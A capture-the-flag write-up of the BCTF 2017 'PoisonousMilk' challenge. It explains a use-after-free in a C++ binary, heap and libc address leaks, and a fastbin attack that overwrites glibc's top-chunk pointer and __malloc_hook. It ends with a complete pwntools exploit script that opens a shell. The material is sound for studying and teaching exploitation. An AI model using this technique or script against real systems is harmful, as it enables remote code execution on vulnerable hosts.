---
layout: post
title: BCTF 2017 - PoisonousMilk
category: [Exploitation]
tags: [Exploitation, BCTF]
comments: true
---

**Points:** 500
**Solves:** 21
**Category:** Exploitation
**Description:** Do you know Huang Xudong? Let me show you his power.

nc 52.27.136.59 6969

> [poisonous_milk]({{site.url}}/assets/poisonous_milk)
> Solved by uafio and kileak


Today I'm going to explain one of my favorite heap exploitation techniques.

## Main

{% highlight text %}
➜  poison_milk ./poisonous_milk
Welcome to rainbow poisonous milk system authored by Xudong Huang
You can leave your flags here~
Milk Guide:
[p]ut a poisonous milk
[v]iew all poisonous milks
[r]emove one milk
[d]rink pocari sweat
[q]uit the system
>
{% endhighlight %}

I will try to keep the description of each of these functions short, although they can be really confusing. Let's first start with the 10,000 ft view. It's a C++ program that allows us to create milk classes. Each milk class has two properties, a `const char *` to a color constant and a `char *` to a input buffer called "flag" that we control. A max of 100 milk classes can be created and a pointer to each is stored in a dynamic array, a pointer to this dynamic array is stored on the .bss

To better illustrate the relations of these structures, here is a pretty diagram made by [rh0gue](http://blog.rh0gue.com/).
![pmilk diagram]({{site.url}}/assets/pmilk_diagram.png)

Now to drill down to each of the options, individually.
* `[p]` - Checks if `(arrayEnd - arrayStart) < 800` (hense the 100 classes limit). Next, it allocates a buffer of max 0x56 bytes for the `milk->flag` reads input into it (without overflow), it reads input for the color choice and compares it with a list of constants. If a match is found it populates the `milk->color_ptr` with the pointer to the constant color (not with the pointer of our color input). If a match is not found it leaves the `milk->color_ptr` uninitialized, a fact that we are going to take advantage of.
* `[v]` - Iterate through all of the milkArr and `printf("[%d] [%s] %s\n", i, milkArr[i]->color, milkArr[i]->flag)`
* `[r]` - Without any out of bounds it simply does `delete milkArr[idx]->flag ; delete milkArr[idx]` and since the milkArr is a dynamic array it pops the index out of the array and adjusts the size, however, neither of the two pointers are nulled essentially creating a UAF.
* `[d]` - Delete all the milk classes from the milkArr, the associated flag properties, the milkArr and the milkTable. Essentially freeing all of the dynamically allocated pointers the program knows about in its' current state. Except it won't NULL the `milkTable_ptr` located on the bss creating another UAF.
* `[q]` - returns from main

## Leaking the heap

First step of our exploit is to get not one but two info leaks. The binary is PIE enabled and we need to know where the heap is allocated and where libc is loaded. I'm going to be thorough here and going to show you how the memory layout looks like compared to the diagram above.

![pmilk mem1]({{site.url}}/assets/Screen_Shot_2017-04-17_at_9_30_09_PM.png)

Notice how `milkArr[0]->color` is `NULL` this is not because it's being zeroed but instead it's because it's uninitialized which we are going to exploit. If we free the only milk structure in the milkArr the program will do `delete(milkArr[0]->flag)` followed by `delete(milkArr[0])` followed by adjusting the values in the milkTable indicating there's no more elements in the milkArr. We know both of the elements we are going to free are of size 0x20, which means they are of fastbin size. The first element we free is going to be placed on top of the fastbin free list for size 0x20 with `buffer->FD = NULL` because the fastbin free lists are singly linked lists and `FD == NULL` represents the end of the list, this means `free()` is going to remove our `0x4141414141414141` out of `0x555555769c40` address. However, the next `delete(milkArr[0])` will free chunk `0x555555769c60` and because we already have a node in the fastbin list for this size, it will replace the node on top of the fastbin list and put the old fastbin top in `the current fastbin top -> FD`. Which means it will place a heap address in that uninitialized milk->color property which lucky enough points to a pointer of the end of the dynamic array!

![pmilk mem2]({{site.url}}/assets/Screen_Shot_2017-04-17_at_10_02_12_PM.png) 

All that's left now is to create a new milk class without providing a color so we keep that fastbin stored pointer. One thing to notice here is that the new milk class's flag needs to be bigger than the size of the currently free fastbin. This way we will not serve the same chunks for the same structures/buffers. Instead allocating a bigger chunk for the `flag` property will force malloc to serve a new buffer from the wilderness and serve the previous `flag` buffer as a memory for the now current milk class, exactly with the heap pointer in place of the `color` property, which we are going to keep "uninitialized" (or forcefully initialized by us :P).

{% highlight python %}
    put_milk("A"*15 + '\n', '\n')
    remove(0)
    put_milk('B'*85, '\n')
    leak = u64(view().split('[')[2].split(']')[0].ljust(8, '\0')) - 0xc88
    log.info("Heap: " + hex(leak))
{% endhighlight %}

## Leaking libc

To leak an address of libc we need to somehow place a libc address on the heap. But we can't simply free a chunk and hope for a libc pointer to end up on the heap because all of the chunks are of fastbin size. So the plan is to free a fake chunk of size of a smallbin and then leak either the FD or the BK ptrs. To free a fake chunk, we are going to target the `arrayStart` and `arrayEnd` pointers. By pointing those to a controlled heap address, we can essentially take control over the `milkArr`. For that we are going to use the `[d]rink` option which is going to free the `milkTable` and then we create a new milk class and the buffer for the `flag` property will end up getting the `milkTable`'s old buffer, essentially giving us control over the `arrayStart and arrayEnd ptrs`. Here a lot of coordination was required because the "fake" `milkArr` had to be pre-setup with not just the "fake smallbin chunk" but also with fake pointers to chunks we are going to need for later.

{% highlight python %}
gdb-peda$ x/60gx 0x555555769c20
0x555555769c20: 0x0000555555769d38  0x0000555555769d50  <-- milkTable
0x555555769c30: 0x0000000000000000  0x0000000000000021
0x555555769c40: 0x0000555555769c50  0x0000555555769d00
0x555555769c50: 0x0000000000000000  0x0000000000000021
0x555555769c60: 0x0000555555769d50  0x0000555555769ca0
0x555555769c70: 0x0000000000000000  0x0000000000000021
0x555555769c80: 0x0000555555769c30  0x0000555555769d80
0x555555769c90: 0x0000000000000000  0x0000000000000061
0x555555769ca0: 0x0000000000000000  0x0000555555769d10
0x555555769cb0: 0x0000000000000000  0x0000000000000051
0x555555769cc0: 0x0000555555769cc0  0x0000000000000000
0x555555769cd0: 0x4141414141414141  0x4141414141414141
0x555555769ce0: 0x4141414141414141  0x4242424242424200
0x555555769cf0: 0x0000004242424242  0x0000000000000061
0x555555769d00: 0x0000555555769c90  0x00000000000000d1
0x555555769d10: 0x0000000000424242  0x0000000000424242
0x555555769d20: 0x0000000000424242  0x0000000000424242
0x555555769d30: 0x0000000000424242  0x0000555555769ca0  <-- 0x424242,   milkArr[0]
0x555555769d40: 0x0000555555769ca0  0x0000555555769e10  <-- milkArr[1], milkArr[2]
0x555555769d50: 0x0000000000000000  0x0000000000000021
0x555555769d60: 0x0000000000000000  0x0000555555769c40
0x555555769d70: 0x0000000000000000  0x0000000000000061
0x555555769d80: 0x0000555555769cf0  0x4343434343434343
0x555555769d90: 0x4343434343434343  0x4343434343434343
0x555555769da0: 0x4343434343434343  0x4343434343434343
0x555555769db0: 0x4343434343434343  0x4343434343434343
0x555555769dc0: 0x4343434343434343  0x4343434343434343
0x555555769dd0: 0x0000000000000000  0x0000000000000031
0x555555769de0: 0x0000000000000000  0x0000555555769c40
0x555555769df0: 0x0000555555769c80  0x0000000000000000
{% endhighlight %}

Our fake smallbin chunk here is `milkArr[0]->flag` which points to `0x0000555555769d10` with size `0xd1`. So, we free `milkArr[0]` and then `[v]iew` and we got ourselves a libc info leak :).

{% highlight python %}
gdb-peda$ x/60gx 0x555555769c20
0x555555769c20: 0x0000555555769d38  0x0000555555769d48  <-- arrayEnd decremented
0x555555769c30: 0x0000000000000000  0x0000000000000021
0x555555769c40: 0x0000555555769c50  0x0000555555769d00
0x555555769c50: 0x0000000000000000  0x0000000000000021
0x555555769c60: 0x0000555555769d50  0x0000555555769ca0
0x555555769c70: 0x0000000000000000  0x0000000000000021
0x555555769c80: 0x0000555555769c30  0x0000555555769d80
0x555555769c90: 0x0000000000000000  0x0000000000000061
0x555555769ca0: 0x0000555555769d70  0x0000555555769d10
0x555555769cb0: 0x0000000000000000  0x0000000000000051
0x555555769cc0: 0x0000555555769cc0  0x0000000000000000
0x555555769cd0: 0x4141414141414141  0x4141414141414141
0x555555769ce0: 0x4141414141414141  0x4242424242424200
0x555555769cf0: 0x0000004242424242  0x0000000000000061
0x555555769d00: 0x0000555555769c90  0x00000000000000d1
0x555555769d10: 0x00007ffff7dd1b78  0x00007ffff7dd1b78  <-- fake chunk has been freed
0x555555769d20: 0x0000000000424242  0x0000000000424242
0x555555769d30: 0x0000000000424242  0x0000555555769ca0
0x555555769d40: 0x0000555555769e10  0x0000555555769e10
0x555555769d50: 0x0000000000000000  0x0000000000000021
0x555555769d60: 0x0000000000000000  0x0000555555769c40
0x555555769d70: 0x0000000000000000  0x0000000000000061
0x555555769d80: 0x0000555555769cf0  0x4343434343434343
0x555555769d90: 0x4343434343434343  0x4343434343434343
0x555555769da0: 0x4343434343434343  0x4343434343434343
0x555555769db0: 0x4343434343434343  0x4343434343434343
0x555555769dc0: 0x4343434343434343  0x4343434343434343
0x555555769dd0: 0x00000000000000d0  0x0000000000000030
0x555555769de0: 0x0000000000000000  0x0000555555769c40
0x555555769df0: 0x0000555555769c80  0x0000000000000000
{% endhighlight %}

## Fastbin attack

On the next part I decided to take control over the `milkArr` pointers. This way I can control each individual milk class without worrying for the size of the `milkTable`. Well, this has already been taken care of :). On the last part where I said some coordination was needed, if you notice our "fake" smallbin chunk is located on top of the `milkArr`, now I just need to request a chunk of size which does not have a corresponding free fastbin. This way malloc will serve us a chunk from the currently free smallbin at `0x555555769d10` and placing whatever is the remainder in the unsorted bin (which gave me a lot of trouble later :P). Next with some convolution, I arrange everything so the next allocation of a "flag" buffer for a new milk is going to be allocated on top of already free chunk and I can overwrite it's `FD ptr` and do fastbin attack.

However ! I can't simply place a ptr of `&__malloc_hook - 0x23` in a fastbin like I did [here](http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html) because the "fake" size needed to pass the fastbin size allocation will be `0x7f` and the largest heap chunk I can allocate is 0x56 bytes + 0x10 for metadata making it total 0x60 (rounded). So, what to do next ?

## Impossible fastbin attack ?

This is my favorite trick in the book :). Instead of placing a pointer of `&__mallok_hook - 0x23` we are going to place a pointer of `&main_arena + 0x25` which will point right on top of the fastbinsY array.

{% highlight python %}
gdb-peda$ x/40gx &main_arena
0x7ffff7a4fb20 <main_arena>:    0x0000000000000000  0x0000000000000000
0x7ffff7a4fb30 <main_arena+16>: 0x0000555555769dd0  0x0000000000000000
0x7ffff7a4fb40 <main_arena+32>: 0x00007ffff7a4fb45  0x0000555555769d70
0x7ffff7a4fb50 <main_arena+48>: 0x0000000000000000  0x0000000000000000
0x7ffff7a4fb60 <main_arena+64>: 0x0000000000000000  0x0000000000000000
0x7ffff7a4fb70 <main_arena+80>: 0x0000000000000000  0x0000555555769e20
0x7ffff7a4fb80 <main_arena+96>: 0x0000555555769db0  0x0000555555769db0

gdb-peda$ p main_arena
$4 = {
  mutex = 0x0,
  flags = 0x0,
  fastbinsY = {0x0, 0x555555769dd0, 0x0, 0x7ffff7a4fb45 <main_arena+37>, 0x555555769d70, 0x0, 0x0,
    0x0, 0x0, 0x0},
  top = 0x555555769e20,
  last_remainder = 0x555555769db0,
  bins = {0x555555769db0, 0x555555769db0, 0x7ffff7a4fb88 <main_arena+104>,
{% endhighlight %}


What would this do, you ask ? Well, on the next allocation of the appropriate size it will give us the `0x00007ffff7a4fb55` address and the target is the `ptr to the top chunk`. Overwriting the pointer to the top chunk will point the `wilderness/top` to address we want and allocations after that will be server from that memory area ! The only requirement is for the new `top chunk` to have enough data so choosing an address with `new_top_chunk->size != NULL` is required. What about the fastbin size check you might ask again :) ? Well that's why there's an already intentionally free chunk in `0x7ffff7a4fb48` address. So the MSB `0x55` is going to serve as the size of the free fake fastbin.

{% highlight python %}
gdb-peda$ x/10gx 0x00007ffff7a4fb45
0x7ffff7a4fb45 <main_arena+37>: 0x5555769d7000007f  0x0000000000000055  <-- fake size
0x7ffff7a4fb55 <main_arena+53>: 0x0000000000000000  0x0000000000000000
0x7ffff7a4fb65 <main_arena+69>: 0x0000000000000000  0x0000000000000000
0x7ffff7a4fb75 <main_arena+85>: 0x5555769e20000000  0x5555769db0000055
0x7ffff7a4fb85 <main_arena+101>:    0x5555769db0000055  0x5555769db0000055
{% endhighlight %}

OK, we control the new `top` chunk, where do we point it ? Haha, at `&__malloc_hook - 0x28` ofcourse :).

{% highlight python %}
gdb-peda$ x/40gx 0x00007ffff7dd1ae0
0x7ffff7dd1ae0: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1af0: 0x00007ffff7dd0260  0x0000000000000000
0x7ffff7dd1b00 <__memalign_hook>:   0x00007ffff7a93270  0x00007ffff7a92e50
0x7ffff7dd1b10 <__malloc_hook>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b20: 0x0000000000000000  0x0000555555769d70
0x7ffff7dd1b30: 0x0000555555769dd0  0x0000000000000000
0x7ffff7dd1b40: 0x0000000000000000  0x0000565555769d70
0x7ffff7dd1b50: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b60: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b70: 0x0000000000000000  0x00007ffff7dd1ae8  <-- new_top
0x7ffff7dd1b80: 0x0000000000000000  0x00007ffff7dd1b78  <-- unsorted bin
0x7ffff7dd1b90: 0x00007ffff7dd1b78  0x00007ffff7dd1b00  <-- unsorted bin
0x7ffff7dd1ba0: 0x00007ffff7dd1b88  0x00007ffff7dd1b98
0x7ffff7dd1bb0: 0x00007ffff7dd1b98  0x00007ffff7dd1ba8
{% endhighlight %}

As you can see if `new top` starts at `0x7ffff7dd1ae8` the pointer at `0x7ffff7dd1af0` is going to serve as `new_top->size` and we are all good, yes even with the LSB(it) being 0.

My biggest frustration with this tactic is that the unsorted bin did not point to itself meaning there is a free chunk in the unsorted bin, meaning new allocations will not be served from the top chunk. So with the overwrite of the `top` chunk I also had to NULL the `last_remainder ptr` (which is located at `0x7ffff7dd1b80`) and restore the unsorted bin ptrs to the address of `&main_arena->top`

Another hic-up is the "fake size" from the MSB(yte) of one of the pointers in the fastbins. with ASLR the heap has a chance to start with either `0x55` or `0x56` address. Without ASLR it's only `0x55`. In my calculations this only worked with "fake size" of `0x56`, `0x55` fails the index of fastbin allocation check. I'm assuming "fake size" of `0x55` can pass the check if the "fake fastbin ptr" is placed 1 slot before where it's currently located.

## Full exploit script

{% highlight python %}
#!/usr/bin/env python

from pwn import *
import sys

def put_milk(inBuf, color):
    r.sendline('p')
    r.recvuntil(': ')
    r.send(inBuf)
    r.recvuntil(': ')
    r.send(color)
    r.recvuntil('> ', timeout=1)

def view():
    r.sendline('v')
    return r.recvuntil('> ', drop=True)

def remove(idx):
    r.sendline('r')
    r.recvuntil(' : ')
    r.sendline(str(idx))
    r.recvuntil('> ')

def drink():
    r.sendline('d')
    r.recvuntil('> ')

def exploit(r):
    if len(sys.argv) > 1:
        r.recvuntil("Token:")
        r.sendline('yuRRme9y3wc5ZCHyhckEBnRsR3ueR8M8')

    put_milk("A"*15 + '\n', '\n')
    remove(0)
    put_milk('B'*85, '\n')

    leak = u64(view().split('[')[2].split(']')[0].ljust(8, '\0')) - 0xc88
    log.info("Heap: " + hex(leak))
    if leak < 0x560000000000:
        log.failure("Error: HEAP needs to start with 0x56 addr.")
        sys.exit(-1)

    remove(0)

    payload  = p64(leak+0xd10)*2
    payload += p64(0)
    payload += p64(0x51)
    payload += p64(leak+0xcc0)
    payload += p64(0)
    payload += "A" * 0x18
    payload += '\n'
    put_milk(payload, '\n')

    payload = p64(0xd1) * 2
    payload += p64(0x424242) * 5
    payload += p64(leak+0xca0)*2
    payload += 'B' * 2
    payload += '\n'
    put_milk(payload, '\n')

    payload  = 'C' * 0x50
    payload += '\n'
    put_milk(payload, '\n')

    drink()

    payload  = p64(leak+0xd38)
    payload += p64(leak+0xd48)
    payload += '\n'
    put_milk(payload, '\n')

    remove(0)

    libc = u64(view().split('\n')[0].split()[-1].ljust(8, '\0')) - 0x3c3b78
    log.info("libc: " + hex(libc))

    payload  = p64(0x444444444444) * 2
    payload += p64(0x41)*2
    payload += p64(0x444444444444)
    payload += p64(leak+0xc80)
    payload += p64(leak+0xcc0)
    payload += '\n'
    put_milk(payload, '\n')

    remove(1)

    payload  = p64(0x61616161) * 2
    payload += p64(0)
    payload += p64(0x51)
    payload += p64(libc+0x3c3b45)*6
    payload += '\n'
    put_milk(payload, '\n')

    payload = p64(0x61) * 2
    payload += p64(0x404040)
    payload += p64(0x393939)
    payload += p64(0x41414141)*4
    put_milk(payload+'\n', '\n')

    remove(0)

    payload = '\x00' * 3
    payload += p64(0) * 4
    payload += p64(libc+0x3c3ae8)
    payload += p64(0)
    payload += p64(libc+0x3c3b78)
    payload += p64(libc+0x3c3b78)
    put_milk(payload+'\n', '\n')

    payload  = p64(0x41414141)*3
    payload += p64(libc + 0xf0567) * 4
    payload += '\n'
    put_milk(payload, '\n')

    r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./poisonous_milk'], env={"LD_PRELOAD":"./libc-2.23.so"})
        print util.proc.pidof(r)
        pause()
        exploit(r)
{% endhighlight %}

> Cheers

